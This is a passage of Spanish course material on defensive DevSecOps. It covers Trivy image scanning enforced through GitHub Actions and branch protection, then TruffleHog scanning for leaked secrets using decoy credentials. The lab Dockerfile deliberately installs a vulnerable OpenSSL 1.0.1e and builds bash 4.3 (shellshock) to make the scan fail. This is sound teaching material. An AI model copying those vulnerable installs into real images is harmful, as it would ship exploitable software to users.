el archivo:</p> <pre><code>$ nano docker-builder/registry-repos/trivy-tutorial/Dockerfile\n</code></pre> <p>Y descomentamos las l\u00edneas resaltadas:</p> <p><pre><code>FROM debian\n\nENV DEBIAN_FRONTEND noninteractive\n\n# +--------------------+\n# SYSTEM-LEVEL PACKAGE MANAGER INSTALLATIONS\n# (and misc dependencies) \n# +--------------------+\n\nRUN apt-get update -y &amp;&amp;\\\napt-get dist-upgrade -y &amp;&amp;\\\n#    apt-get install -y apache2 \\\n#        wget \\\n#        build-essential &amp;&amp;\\\napt-get autoremove &amp;&amp;\\\napt-get clean &amp;&amp;\\\nrm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\n#RUN wget http://snapshot.debian.org/archive/debian/20130319T033933Z/pool/main/o/openssl/libssl1.0.0_1.0.1e-2_amd64.deb -O /tmp/libssl1.0.0_1.0.1e-2_amd64.deb &amp;&amp; \\\n#    dpkg -i /tmp/libssl1.0.0_1.0.1e-2_amd64.deb\n#\n#RUN wget http://snapshot.debian.org/archive/debian/20130319T033933Z/pool/main/o/openssl/openssl_1.0.1e-2_amd64.deb -O /tmp/openssl_1.0.1e-2_amd64.deb &amp;&amp;\\\n#    dpkg -i /tmp/openssl_1.0.1e-2_amd64.deb\n# +--------------------+\n# MAKE INSTALLATION (shellshock)\n# (system-level installation WITHOUT package manager)\n# +--------------------+\n\n#RUN wget https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz &amp;&amp; \\\n#    tar zxvf bash-4.3.tar.gz &amp;&amp; \\\n#    cd bash-4.3 &amp;&amp; \\\n#    ./configure &amp;&amp; \\\n#    make &amp;&amp; \\\n#    make install\n\n# +--------------------+\n# APPLICATION-LEVEL PACKAGE MANAGER INSTALLATION (regex DoS)\n# +--------------------+\n\n#COPY lang_dependencies/Pipfile.lock /app/Pipfile.lock\n</code></pre> Y una vez hecho esto, haremos el commit y el push  correspondientes en nuestra nueva rama:</p> <pre><code>git commit -am \"Dockerfile actualizado\" &amp;&amp; git push origin updates\n</code></pre> <p>Tras ello, en el sitio web, crearemos un nuevo Pull Request:</p> <p></p> <p>\u00a1Ojo cuidao!</p> <p>Asegur\u00e1os de que el pull request lo hace\u00eds desde la rama <code>updates</code> de vuestro repositorio a la rama <code>main</code>de vuestro repositorio, como v\u00e9is en lla imagen de abajo.-</p> <p></p> <p>Comparar\u00e1 los cambios realizados e informar\u00e1 de que todo est\u00e1 bien y se puede hacer merge autom\u00e1ticamente de ambas ramas. </p> <p></p> <p>Acto seguido veremos c\u00f3mo est\u00e1 pasando el check requerido, que no es m\u00e1s que la acci\u00f3n definidia en GitHub Actions para que escanee la imagen Docker creada.</p> <p>Tambi\u00e9n nos informa de que el merge est\u00e1 bloqueado puesto que requiere de aprobaci\u00f3n expl\u00edcita. Esto es debido a las protecciones de rama que hemos configurado anteriormente.</p> <p></p> <p>En la pesta\u00f1a <code>Checks</code> podemos ver que se van ejecutando, una tras otra, todas las acciones definidias y comprobamos que, tras instalar Trivy en la m\u00e1quina virtual de la infraestructura de GitHub, est\u00e1 ejecutando el escaneo de vulnerabilidades pertinente:</p> <p></p> <p>Y tras unos segundos, se produce un fallo debido a que se han encontrado vulnerabilidades (las mismas que en el escaneo local que vimos al principio):</p> <p></p> <p>Tal y como vimos anteriormente, ahora podr\u00edamos ver el resultado de Trivy en la salida de nuestro check y comprobar que el problema que desencadena las vulnerabilidades es la inclusi\u00f3n de la librer\u00eda <code>libSSL</code> vulnerable. Podemos ver tambi\u00e9n que la versi\u00f3n que da problemas coincide justo con la que nosotros instalamos en nuesro Dockerfile.</p> <p>Gracias a este <code>status check</code> que conforma el escaneo de Trivy, podemos prevenir que publiquemos en nuestro entorno im\u00e1genes de Docker vulnerables. Aunque un revisor aprobase el merge, \u00e9ste no se producir\u00eda por haber fallado el <code>status check</code>.</p> <p>Hemos visto en una imagen m\u00e1s arriba que, puesto que soy administrador del repositorio, me permite sobreescribir esta regla y forzar el merge (bypass branch protection) pero es obvio que no todos los usuarios del repositorio tendr\u00e1n esos privilegios.</p> <p>Tarea</p> <p>Vamos a recomentar las l\u00edneas que ten\u00edamos comentadas en nuestro Dockerfile para solucinar nuestro fallo de haber incluido unas librer\u00eda vulnerable (no hay que preocuparse, esta imagen por defecto lleva inclu\u00edda la versi\u00f3n de <code>libSSL</code> correcta). Tras ello repetiremos nuestro <code>commit</code> y nuestro <code>push</code>, y comprobaremos que ahora s\u00ed, consigue pasar el <code>status check</code> con un estupendo tick verde.</p> <p>Llegados a este punto s\u00f3lo necesitar\u00edamos la aprobaci\u00f3n de un revisor para hacer nuestro merge. Alquien podr\u00eda preguntarse que si Trivy ha dado su benepl\u00e1cito con un escaneo sin vulnerabilidades, para qu\u00e9 ibamos a necesitar una interacci\u00f3n humana en vez de dejarlo todo completamente automatizado. La repuesta es que aunque Trivy tiene much\u00edsimas posibilidades y el funcinamiento es m\u00e1s que aceptable, es incapaz de detectar todas las vulnerabilidades que podr\u00edan ser introducidas dentro de una imagen Docker. Es por ello que siempre se necesita de un ojo experto y humano que revise el pull request.</p>"},{"location":"segdef/trivy_test/#explicacion-del-codigo","title":"Explicaci\u00f3n del c\u00f3digo","text":"<p>Veamos el contenido de los archivos m\u00e1s importantes implicados en nuestro workflow de GitHub Actions.</p> <p>Encontramos el archivo que define el workflow propiamente dicho en <code>.github/workflows/scan.yml</code>. El nombre del workflow es indiferente:</p> scan.yml<pre><code># +--------------------+\n# WORKFLOW SUMMARY\n# +--------------------+\n\n# This is a Github Actions workflow file\n\n## Before modifying the code within a Github Repository, a peer review must occur\n## This peer review occurs within a \"Pull Request\"\n## When a Pull Request occurs, this workflow will use Trivy to scan for vulnerabilities\n\n## Github Actions Overview\n## https://docs.github.com/en/actions/learn-github-actions/introduction-to-github-actions#overview\n\n# +--------------------+\n# ASSUMPTIONS\n# +--------------------+\n\n## Github Branch Protection Rules enforce...:\n## 1. All changes must go through a Pull Request\n## 2. If the Trivy scan FAILS, a Pull Request CAN NOT be merged (i.e., accepted)\n\n\n# +--------------------+\n# MAIN LOGIC\n# +--------------------+\n\nname: Security - Docker - Scan\n\n## Run workflow when new changes are proposed\non: [pull_request] #(1)\n\njobs:\nscan:\nname: Scan Docker Images\n## Workflow runs within an isolated execution environment \n## (e.g., fresh Ubuntu 20.04 server)\nruns-on: ubuntu-20.04 #(2)\nsteps:\n## Allow access to trivy-tutorial Git repo\n- name: Checkout Current Git Repo #(3)\nuses: actions/checkout@v2\n\n- name: Install Trivy\nrun: |\n## Run install script at trivy-tutorial/install.sh\nbash install.sh\n\n- name: Execute Trivy Scans\nrun: |\nbash docker-scan.sh #(5)\n</code></pre> <ol> <li>El workflow se disparar\u00e1 cuando se proponga un nuevo cambio via pull request</li> <li>Este workflow se ejecuta en un entorno aislado, en este caso un Ubuntu 20.04</li> <li>Permitimos el acceso a nuestro repositorio</li> <li>Instalamos Trivy en el entorno usando el script de instalaci\u00f3n</li> <li>Finalmente ejecutamos el script que define el escaneo y que veremos a continuaci\u00f3n</li> </ol> <p>El script que define c\u00f3mo realiza el escaneo Trivy: </p> docker-scan.sh<pre><code>#!/bin/bash\n\n# +--------------------+\n# SUMMARY\n# +--------------------+\n\n## Checks if an Docker Image has vulnerabilities (via Trivy)\n\n# +--------------------+\n# ASSUMPTIONS\n# +--------------------+\n\n## 1. Script expects the following convention: #(1)\n##     trivy-tutorial/docker-builder/registry-repos/REPO_NAME/Dockerfile\n##     (e.g., trivy-tutorial/docker-builder/registry-repos/trivy-tutorial/Dockerfile)\n\n##     Convention is shared with the docker-registry-orchestrator.sh\n##     (uploads Docker Images to the Docker Image Registry)\n\n## 2. Script should be triggered on Pull Requests #(3)\n\n## 3. Docker Image changes (in git) must be approved by a trusted entity #(4)\n##    (Trivy can't find ALL docker vulnerabilities)\n\n# +--------------------+\n# MAIN LOGIC\n# +--------------------+\n\n## Iterate through Docker configurations (See Assumption 1 for path convention)\nfor docker_build_context_relative_path in docker-builder/registry-repos/*; do #(5)\n## Only iterate through directories\n[[ ! -d \"$docker_build_context_relative_path\" ]] &amp;&amp; continue #(6)\n\n## Get the absolute path for the Docker configurations (i.e., build context)\ndocker_build_context_absolute_path=$(realpath \"$docker_build_context_relative_path\") #(7)\n\nlocal_image_name=test-image\n\n    ## Local Docker image build\ndocker build --no-cache --tag \"${local_image_name}\" \"${docker_build_context_absolute_path}\" #(8)\n\n## Ensure that Trivy does NOT scan a cached image\ntrivy image --reset #(9)\n\n## Trivy scan\n## (Into the future, we will make our blocking behavior more granular)\n## If a vulnerability is found, Trivy will emit an exit code of 2\ntrivy image --no-progress --security-checks vuln --severity CRITICAL,HIGH,MEDIUM --exit-code 2 --ignore-unfixed \"${local_image_name}\" #(10)\nvuln_result_code=\"$?\"\n\nif [[ \"$vuln_result_code\" -eq 0 ]]; then #(11)\necho \"Docker image is in compliance with the security policy!\"\necho \"Woo hoo!\"\necho \"Starting scan of next Docker Image (if defined)\"\ncontinue\nelif [[ \"$vuln_result_code\" -eq 2 ]]; then\necho \"This Docker image contains a vulnerability!\"\necho \"Please fix!\"\necho \"PATH: $docker_build_context_absolute_path\"\nexit 1 #(13)\nelse #(14)\necho \"There was an unexpected error!\"\necho \"Please reach out to the Security Team\"\nexit 1\nfi\ndone\n</code></pre> <ol> <li>El script espera esta convenci\u00f3nd de nombres, donde <code>REPO_NAME</code> es el nombre de nuestro repositorio en el Docker Registry (Docker Hub). </li> <li>Esta convenci\u00f3n es para ser compatible con el otro script, docker-registry-orchestrator.sh, que se encarga de subir las im\u00e1genes al registro de Docker.</li> <li>El script se ejecuta cuando se produce un PR</li> <li>Los cambios deben, adicionalmente, ser aprobados por un revisor ya que Trivy funciona muy bien pero no detecta el 100% de las vulnerabilidades.</li> <li>Iteramos sobre los archivos de configuraci\u00f3n de Docker </li> <li>Nos aseguramos de que s\u00f3lo iteramos sobre directorios</li> <li>Obtenemos la ruta absoluta del archivo de configuraci\u00f3n en cuesti\u00f3n </li> <li>Construimos la imagen Docker en local</li> <li>MUY IMPORTANTE porque queremos escanear la imagen reci\u00e9n construida y no obtener resultados de escaneos anteriores de otras im\u00e1genes, por lo que borramos la cach\u00e9 de Trivy</li> <li>Ejecuci\u00f3n del escaneo con Trivy:<ul> <li>Si se encuentra una vulnerabilidad, Trivy emitir\u00e1 el c\u00f3digo de salida <code>2</code></li> </ul> </li> <li>En este bloque, si Trivy emite un c\u00f3digo de salida <code>0</code> signfica que el escaneo ha resultado exitoso y no se ha producio ning\u00fan error inesperado y continua con el escaneo de los siguientes archivos de configuraci\u00f3n</li> <li>Si se produce un c\u00f3digo de salida <code>2</code>, sabemos que esa imagen de Docker contiene una vulnerabilidad.</li> <li>Si salimos con un <code>1</code>, le estamos diciendo a GitHub Actions que el status check es fallido y por tanto bloqueamos el pull request para hacer merge</li> <li>Para el caso de que se produzca un error inesperado no contemplado anteriormente</li> </ol>"},{"location":"segdef/trivy_test/#demostracion-3","title":"Demostraci\u00f3n 3","text":"<p>En esta demostraci\u00f3n pr\u00e1ctica veremos:</p> <ul> <li>C\u00f3mo usar GitHub actions para subir nuestra im\u00e1genes al registro de Docker</li> <li>Construir/reconstruir im\u00e1genes Docker peri\u00f3dicamente para reducir vulnerabilidades (enfoque proactivo)</li> <li>C\u00f3mo burlar los escaneos de Trivy</li> <li>Manipulaci\u00f3n del registro de Docker</li> <li>Vulnerabilidades que no escaneables</li> </ul> <p>En la secci\u00f3n Manos a la obra se mostraba una imagen donde se ve\u00edan dos puntos de aparici\u00f3n de GitHub Actions; los escaneos de Trivy y el proceso de Build o creaci\u00f3n de la imagen Docker. Como ya hemos visto en profundidad el primero, nos centraremos ahora en el segundo.</p> <p>Surgen un par de preguntas:</p> <ol> <li>\u00bfC\u00f3mo se suben las im\u00e1genes a Docker Hub tras escanearlas con Trivy?</li> <li>\u00bfQu\u00e9 pasa si un atacante compromete nuestro Docker Hub y sube una imagen maliciosa? \u00bfC\u00f3mo podr\u00edamos saberlo?</li> </ol> <p>Comencemos con un resumen del workflow:</p> <pre><code># +--------------------+\n# WORKFLOW SUMMARY\n# +--------------------+\n\n## 1. Builds Docker Images and uploads them to remote Docker Registry # (1)\n## 2. Does signature validation to ensure Docker Images (in the Registry) have not been tampered with. # (2)\n\n\n# +--------------------+\n# MAIN LOGIC\n# +--------------------+\n\nname: Security - Docker - Registry Orchestrator\non:\n#  schedule: # (3)\n## When our Docker Images are rebuilt, package updates occur\n## By executing this workflow on a recurring schedule, we minimize\n## vulnerabilities that can be discovered by Trivy\n## COMMENTED OUT TO SAVE RESOURCES\n#    - cron: '0 0 * * *'\npush: # (4)\nbranches:\n## When a Pull Request is accepted, its code is merged into the main branch\n## At that point, this workflow will be triggered and Docker Images will be uploaded \n## to the Registry\n- main\npaths-ignore: #(5)\n## When a Docker Image is built, the Image's unique signature \n## is committed into the main branch of the Git repo.\n## (This allows us to check for malicious updates to Docker Images)\n\n## This workflow file will invoke docker-registry-orchestrator.sh\n\n## docker-registry-orchestrator.sh:\n## a) commits a Docker Image's signature into the main branch\n##                  (see path below)\n## b) uses the signature to check for Docker Registry tampering\n\n## If we allowed this path to trigger this workflow, we would\n## have an infinite loop\n- docker-builder/registry-repos/trivy-tutorial/image_sha.txt\n\njobs:\ndocker-registry-orchestrator:\nname: Docker Registry Orchestrator\nruns-on: ubuntu-20.04\nsteps:\n## Allow access to trivy-tutorial Git repo\n- name: Checkout current git repo # (6)\nuses: actions/checkout@v2\nwith:\n## We use a separate Github User (i.e., an \"automation user\") specifically\n## for this workflow.\n## This user is given \"admin\" permissions so they can bypass\n## the branch protection rules and commit the Docker Image Signature DIRECTLY into the main branch\n## Setup instructions: https://github.com/zachroofsec-org/trivy-tutorial#github-action-setup-instructions-advanced\ntoken: ${{ secrets.GIT_AUTOMATION_USER_TOKEN }} # (7)\n\n- name: Install Trivy # (8)\nrun: |\n## Run install script at trivy-tutorial/install.sh\nbash install.sh\n\n## Log in to the Dockerhub Image Registry\n## (allows us to eventually upload our Docker Images)\n- name: Log in to Dockerhub # (9)\nuses: docker/login-action@v1\nwith:\nusername: ${{ secrets.DOCKERHUB_USERNAME }}\npassword: ${{ secrets.DOCKERHUB_PASSWORD }}\n## Setup instructions: https://github.com/zachroofsec-org/trivy-tutorial#github-action-setup-instructions-advanced\n\n- name: Docker Registry Interactions # (10) \nrun: |\nbash docker-registry-orchestrator.sh latest ${{ secrets.DOCKERHUB_USERNAME }}\n## We'll explore the script's arguments in the next section\n\n## Setup instructions: https://github.com/zachroofsec-org/trivy-tutorial#github-action-setup-instructions-advanced\n</code></pre> <ol> <li>Como hemos dicho, este workflow invoca a un script que construye la imagen Docker y la sube al registro de Docker.</li> <li>Tambi\u00e9n invoca a otro script que realiza la validaci\u00f3n de la firma para asegurarse de que las im\u00e1genes del registro no han sido modificadas.   </li> <li> <p>Cuando se reconstruyen las im\u00e1genes, tamb\u00e9n se producen actualizaciones de paquetes. </p> <p>Ejecutando este workflow peri\u00f3dicamente (schedule) minimizamos las vulnerabilidades que pueden aparecer en el escaneo de Trivy.</p> <p>La raz\u00f3n por la que se produce esta actualizaci\u00f3n es porque, si recordamos, en nuestro Dockerfile hab\u00eda una orden de actualizaci\u00f3n de paquetes del sistema operativo (<code>apt-get upgrade</code>).</p> <p>Aparece aqu\u00ed como prueba de concepto, comentado con el fin de ahorrar recursos.</p> </li> <li> <p>El evento push es cuando se acepta un pull request y se hace merge de este c\u00f3digo con la rama main. </p> <p>En este punto el workflow se iniciar\u00e1 y las im\u00e1genes de Docker se subir\u00e1n al registro.</p> </li> <li> <p>Cuando se construye una imagen la firma de la misma se incluye en <code>image_sha.txt</code> y se env\u00eda a la rama <code>main</code> del repositorio.</p> <p>Si permiti\u00e9ramos que este path activara el workflow, habr\u00eda un bucle infinito, as\u00ed que debemos tener en cuenta esa casu\u00edstica y por eso le decimos que se ignore el push en este path.</p> </li> <li> <p>Damos permiso para acceder al repositorio</p> </li> <li> <p>Utilizamos un usuario con permisos de administraci\u00f3n para poder bypassear la protecci\u00f3n de rama y poder hacer un push de la firma a la rama main directamente.</p> </li> <li> <p>Cada vez que se ejecuta el workflow se crea una m\u00e1quina virtual nueva, as\u00ed que tenemos que instalar Trivy siempre.</p> </li> <li> <p>Esto nos permite hacer login en el registro de Docker para subir luego la imagen.</p> </li> <li> <p>Invocamos al script docker-registry-orchestator</p> </li> </ol>"},{"location":"segdef/truffle/","title":"An\u00e1lisis de archivos/repositorios con TruffleHog","text":""},{"location":"segdef/truffle/#introduccion","title":"Introducci\u00f3n","text":"<p>TruffleHog es una herramienta de c\u00f3digo abierto dedicada al an\u00e1lisis de archivos desarrollada y mantenida por Truffle Security.</p> <p>Para dominar la seguridad de nuestra empresa es importante poseer un control completo de nuestras credenciales y secretos. Puesto que un entorno completamente seguro es una utop\u00eda, uno de nuestros objetivos ser\u00e1 reducir el tiempo entre un robo o filtraci\u00f3n de credenciales y la detecci\u00f3n por nuestra parte para ponerle remedio.</p> <p>En esta secci\u00f3n veremos como usar TruffleHog para identificar y detectar estas credenciales o secretos que, por error, despiste o cualquier otra raz\u00f3n est\u00e1n almacenados en nuestros repositorios de c\u00f3digo fuente. Para este cometido nos centraremos espec\u00edficamente en Github, probablemente el m\u00e1s usado. </p>"},{"location":"segdef/truffle/#trufflehog","title":"TruffleHog","text":"<p>TruffleHog sirve como complemento al trabajo de un Blue Team. Utiliza la l\u00ednea de comandos para operar y es relativamente simple de configurar, usar y aprender.</p> <p></p> <p>Puede usarse para auditar uno o varios repositorios simult\u00e1nemamente, as\u00ed como configurarlo para para cumplir objetivos de seguridad gen\u00e9ricos o espec\u00edficos.</p> <p>Hay dos puntos clave a la hora de utilizar TruffleHog:</p> <ol> <li> <p>Realizar un an\u00e1lisis o auditor\u00eda de un repositorio de c\u00f3digo fuente como Github (repo de ahora en adelante).</p> <p>Se puede realizar una b\u00fasqueda utilizando la configuraci\u00f3n por defecto o con cambios m\u00ednimos. Lo bueno de este punto es que permite hacerse una idea ninicial de la capacidad de Trufflehog para realizar un an\u00e1lisis r\u00e1pido.</p> </li> <li> <p>Realizar un an\u00e1lisis customizado o personalizado. Puesto que TruffleHog puede devolver una cantidad de informaci\u00f3n tal que resulte abrumadora para el Blue Team correspondiente, se pueden realizar b\u00fasquedas muy espec\u00edficas.</p> </li> </ol> <p>Personalizar y configurar TruffleHog para casos muy espec\u00edficos es una funcionalidad muy interesante.</p> <p>Merece la pena comentar que se pueden utilizar distintas instancias de TruffleHog  en distintos entornos (test, preprod, prod...) con distintas configuraciones.</p> <p>TruffleHog trabaja tanto con expresiones regulares como con un concepto conocido como entrop\u00eda:</p> <p>Cita</p> <p>[TruffleHog] will go through the entire commit history of each branch, and check each diff from each commit, and check for secrets. This is both by regex and by entropy. For entropy checks, truffleHog will evaluate the shannon entropy for both the base64 charset and hexadecimal char set for every blob of text greater than 20 characters comprised of those character sets in each diff. If at any point a high entropy string &gt;20 characters is detected, it will print to the screen.\u201d</p> <p>Es decir, calcula la entrop\u00eda de las diferencias entre cada commit, tanto en base64 como hexadecimal y para cada texto mayor de 20 car\u00e1cteres.</p> <p>Aclaraci\u00f3n</p> <p>El concepto de entrop\u00eda o entrop\u00eda de Shannon proviende de la teor\u00eda de la comunicaci\u00f3n y mide la incertidumbre de una fuente de informaci\u00f3n. No obstante, esta definici\u00f3n es imprecisa. La definici\u00f3n real de entrop\u00eda es el grado de informaci\u00f3n/desinformaci\u00f3n que tenemos de un sistema. Es decir, cuanta m\u00e1s informaci\u00f3n tengamos menos entrop\u00eda. </p> <p>Citando a la Wikipedia:</p> <p>\"Los s\u00edmbolos con menor probabilidad son los que aportan mayor informaci\u00f3n; por ejemplo, si se considera como sistema de s\u00edmbolos a las palabras en un texto, palabras frecuentes como \u00abque\u00bb, \u00abel\u00bb, \u00aba\u00bb aportan poca informaci\u00f3n, mientras que palabras menos frecuentes como \u00abcorren\u00bb, \u00abni\u00f1o\u00bb, \u00abperro\u00bb aportan m\u00e1s informaci\u00f3n. Si de un texto dado borramos un \u00abque\u00bb, seguramente no afectar\u00e1 a la comprensi\u00f3n y se sobreentender\u00e1, no siendo as\u00ed si borramos la palabra \u00abni\u00f1o\u00bb del mismo texto original. Cuando todos los s\u00edmbolos son igualmente probables (distribuci\u00f3n de probabilidad plana), todos aportan informaci\u00f3n relevante y la entrop\u00eda es m\u00e1xima. \"</p> <p></p> <p>Antes de continuar, deben nombrarse los frameworks o marcos de ciberseguridad. Hay muchos marcos disponbiles y la decisi\u00f3n de elegir uno en concreto depende de la ideneidad para la empresa en cuesti\u00f3n.</p> <p>El NIST es una de las organizaciones que elabora estos marcos y que abarcan un conjunto de normas, directrices y mejores pr\u00e1cticas para alcanzar un nivel de madurez adecuado en cuanto a ciberseguridad. Como v\u00e9is en la imagen, las categor\u00edas est\u00e1n divididas en: identificar, proteger, detectar, responder y recuperar.</p> <p></p> <p>Cada categor\u00eda contiene otras subcategor\u00edas que est\u00e1n vinculadas a actividades espec\u00edficas que una organizaci\u00f3n necesita llevar a cabo para mejorar su nivel de madurez en ciberseguridad.</p> <p></p> <p>TruffleHog es una herramienta que ayuda a una organizaci\u00f3n en la categor\u00eda de anomal\u00edas y eventos. En general, esto ayuda a una organizaci\u00f3n a tener mejor informaci\u00f3n para preparar futuras estrategias de seguridad, mejorarla y poder mitigar a\u00fan m\u00e1s el riesgo.</p> <p>TruffleHog forma parte del proceso de correlaci\u00f3n y datos de eventos. El resultado de la herramienta puede determinar qu\u00e9 impacto pueden tener los eventos maliciosos as\u00ed como ayudar a determinar los umbrales adecuados para las alertas de seguridad.</p> <p>Tambi\u00e9n tenemos nuestra ya conocido marco MITRE ATT&amp;CK, que proporciona diferentes t\u00e9cnicas que un actor de amenaza (threat actor) puede utilizar contra nuestra organizaci\u00f3n. En esta secci\u00f3n trataremos las credenciales no seguras.</p> <p></p> <p>Queremos identificar qu\u00e9 repos desplegados en nuestro entorno contienen fugas de datos sensibles como secretos y/o credenciales.</p> <p>Vamos a ver c\u00f3mo identificar credenciales no seguras en repos y como de f\u00e1cil es para los potenciales atacantes poder realizar el reconocimiento del entorno, probable precursor de un ataque.</p> <p>Por \u00faltimo, MITRE Shield es un marco que cubre las t\u00e9cnicas de ataque, as\u00ed como la forma en que podemos defender nuestros entornos.</p> <p>Utilizando esto podemos vincular las t\u00e9cnicas de ataque con los m\u00e9todos de defensa:</p> <p></p> <p>Es decir, hacer un commit con credenciales intencionadamente inseguras para identificar a los atacantes.</p> <p>Dependiendo de los procesos, madurez y prioridades de una empresa, TuffleHog puede ser desde ejecutado manualmente por los desarrolladores hasta formar parte de un proceso automatizado de DevSecOps, donde se ejecute mediante GitHub actions, por ejemplo.</p>"},{"location":"segdef/truffle/#auditando-repositorios-para-detectar-filtrado-de-credenciales","title":"Auditando repositorios para detectar filtrado de credenciales","text":"<p>Unas credenciales filtradas o expuestas suponen, como es obvio, un gran riesgo para cualquier negocio. Si la empresa tiene suerte, estas credenciales expuestas pueden llevar a un uso razonable en tiempo y recursos para tratar un incidente de seguridad con poco impacto. En el peor escenario puede desembocar en una gran p\u00e9rdida, tanto econ\u00f3mica como reputacional.</p> <p>Algunos de los riesgos de unas credenciales filradas son:</p> <ul> <li>Exfiltraci\u00f3n de datos</li> <li>Movimientos laterales: es mucho m\u00e1s dif\u00edcil detectar a los actores maliciosos utilizando usuarios autenticados accediendo a los sistemas y realizando movimientos laterales, es necesario preventirlo con antelaci\u00f3n.</li> <li>Escalada de privilegios</li> </ul> <p>Aunque vayamos a centrarnos en Github, es importante saber que el c\u00f3digo puede estar almacenado en muchos y muy diferentes lugares: gestores de paquetes de software como <code>pip</code> si se usa Python, el c\u00f3digo de los sitios web con contrase\u00f1as \"hardcodeadas\", Sharepoint u otros sistemas de compartici\u00f3n de archivos como Teams, Slack o Discord. Y por \u00faltimo, en el historial de commits, que es donde haremos hincapi\u00e9.</p> <p>Las credenciales pueden aparecer en los repositorios por diferentes motivos, como desarrolladores que suben c\u00f3digo con credenciales por puro despiste, c\u00f3digo legacy, tras una revisi\u00f3n de c\u00f3digo...</p>"},{"location":"segdef/truffle/#que-hacer-si-aparecen-credenciales-filtradas","title":"\u00bfQu\u00e9 hacer si aparecen credenciales filtradas?","text":"<p>No hay una repuesta clara a esta pregunta, depende de cada caso.</p> <p>La respuesta m\u00e1s obvia ser\u00eda eliminarlas del c\u00f3digo y santas pascuas. Esto puede resultar sencillo en un c\u00f3digo m\u00e1s o menos simple pero en un c\u00f3digo m\u00e1s maduro y complejo podr\u00eda resultar una tarea bastante tit\u00e1nica y habr\u00eda que estudiarlo.</p> <p>Otra soluci\u00f3n ser\u00eda simplemente desactivar las cuentas cuyas credenciales han sido expuestas, convirti\u00e9ndolas en in\u00fatiles. Esta soluci\u00f3n permite conservar el historial de commits y mitigar el riesgo.</p> <p>Por \u00faltimo, si un repositorio no tiene una raz\u00f3n de peso para ser p\u00fablico, podr\u00edamos convertirlo en privado.</p>"},{"location":"segdef/truffle/#uso-de-contrasenas-senuelo","title":"Uso de contrase\u00f1as se\u00f1uelo","text":"<p>En primer lugar debemos instalar TruffleHog en nuestro sistema. A partir de la versi\u00f3n 3 TruffleHog ha sido reescrito en Go y ha cambiado su funcionamiento ya que no utiliza la entrop\u00eda para nada debido a su dificultad de escalamiento para grandes vol\u00famenes de datos. </p> <p>Por motivos de facilidad y para prueba de concepto, utilizaremos versiones anteriores, para ello lo podemos intalar con pip3 (o pipenv si estamos en un entorno virtual):</p> <pre><code>$ pip3 install 'truffleHog&gt;=2.1.0,&lt;3.0'\n</code></pre> <p>Para esta pr\u00e1ctica vamos a utilizar la configuraci\u00f3n por defecto de TruffleHog. Deshabilitaremos el uso de la entrop\u00eda y le indicaremos que haga uso de la funcionalidad <code>regex</code>, que trataremos con mayor profundidad m\u00e1s adelante pero b\u00e1sicamente busca tipos concretos de credenciales haciendo uso de expresiones regulares.</p> <p>B\u00e1sicamente, buscaremos cadenas aleatorias que puedan ser una potencial credencial.</p> <p>Vamos a simular un repositorio privado donde vamos a colocar un archivo con unas credenciales se\u00f1uelo falsas como m\u00e9todo de protecci\u00f3n activa, tal y como recomendaba el Mitre Shield. Lo ideal ser\u00eda tener una pantalla de login donde puedan utilizarse estas credenciales de tal forma que, sabiendo que no funcionan, pudi\u00e9semos monitorizar el comportamiento, mediante su descubrimiento, de los actores de amenazas.</p> <p>As\u00ed pues, analicemos el repositorio: </p> <pre><code>$ trufflehog --regex --entropy=False  https://github.com/raul-profesor/repositorio-interno\n</code></pre> <p>Parece que TruffleHog no ha encontrado nada. Cuando esto ocurre, la aplicaci\u00f3n simplemente no devuelve nada.</p> <p>Tarea</p> <p>Probad ahora activando la entrop\u00eda y comprobad qu\u00e9 se obtiene.</p>"},{"location":"segdef/truffle/#uso-de-analisis-personalizados","title":"Uso de an\u00e1lisis personalizados","text":"<p>En esta tarea lo que haremos ser\u00e1 intentar que TruffleHog busque espec\u00edficamente claves de Azure Storage.</p> <p>Personalizar o customizar los criterios de b\u00fasqueda resulta tremendamente \u00fatil puesto que con ello reducimos la cantidad de resultados a un nivel realista que podemos manejar, as\u00ed como los falsos positivos que nos har\u00edan perder mucho tiempo.</p> <p>Para este ejemplo vamos a suponer que asumimos el rol de un miembro del equipo de seguridad que ha observado que en la organizaci\u00f3n se emplean contenedores Azure Storage. Es por ello que, en previsi\u00f3n, queremos hacer una b\u00fasqueda en el repositorio por si se pudiera filtrar una de las claves asociadas por error.</p> <p>Para personalizar la b\u00fasqueda utilizaremos nuestra propia expresi\u00f3n regular. Las claves de Azure Storage son alfanum\u00e9ricas, es decir, est\u00e1n formadas por letras y n\u00famero y adem\u00e1s al final de la clave nos encontramos con un s\u00edmbolo de suma y dos s\u00edmbolos \"igual\". Adem\u00e1s, la longitud de la clave es de 88 car\u00e1cteres.</p> <p>Tarea</p> <p>Haciendo uso de sitios como este o este, crea una expresi\u00f3n regular que haga match con una cadena formadas por n\u00fameros del 0 al 9, y letras (may\u00fasculas y min\u00fasculas) de la a a la z.  Si no recuerdas las expresiones regulares, puedes hacer uso de consultas en Internet como esta u otras que encuentres.</p> <p>Para hacer que TruffleHog haga uso de esta expresi\u00f3n regular, debemos localizar y modificar el archivo <code>regexes.json</code> que es el que utiliza para este cometido. Este archivo puede variar su ubicaci\u00f3n en funci\u00f3n del sistema que est\u00e9is utilizando. En mi caso est\u00e1 aqu\u00ed:</p> <p><pre><code>/home/raul/.local/lib/python3.9/site-packages/truffleHogRegexes/regexes.json\n</code></pre> Aunque si no lo tuvier\u00e1is ah\u00ed, pod\u00e9is hacer uso de la herramienta <code>locate</code> (deber\u00e9is instalarla) para buscarlo:</p> <p><pre><code>$ sudo updatedb\n$ locate regexes.json\n</code></pre> El primer comando actualiza la base de datos de locate y el segundo hace la b\u00fasqueda.</p> <ul> <li>Es recomendable que hag\u00e1is una copia de seguridad el archivo antes de modificarlo para ahorrarnos posibles problemas.</li> </ul> <p>En este archivo y con el mismo formato que el resto de reglas que ya contiene, deb\u00e9is introducir una nueva con la clave \"Claves de acceso para Azure Storage\"  y como valor, la expresi\u00f3n regular formada anterioremente.</p> <p>Y tras esto, ya no queda m\u00e1s que probar que la expresi\u00f3n regular es correcta y que TruffleHog hace uso de ella, detectando en la salida una clave de la tipolog\u00eda que le hemos dicho. Para ello le diremos, igual que antes, que utilice las expresiones regulares (utilizar\u00e1 por defecto el archivo regexes.json que hemos modificado) pero no la entrop\u00eda, ya que no nos hace falta al querer afinar la b\u00fasqueda con las regex.</p> <p>El repositorio que queremos analizar es el siguiente: <code>https://github.com/raul-profesor/clave-azure</code></p> <p>Tarea</p> <p>Documenta el comando y la salida que obtienes, haciendo notar que se obtienen \u00fanicamente valores a partir de 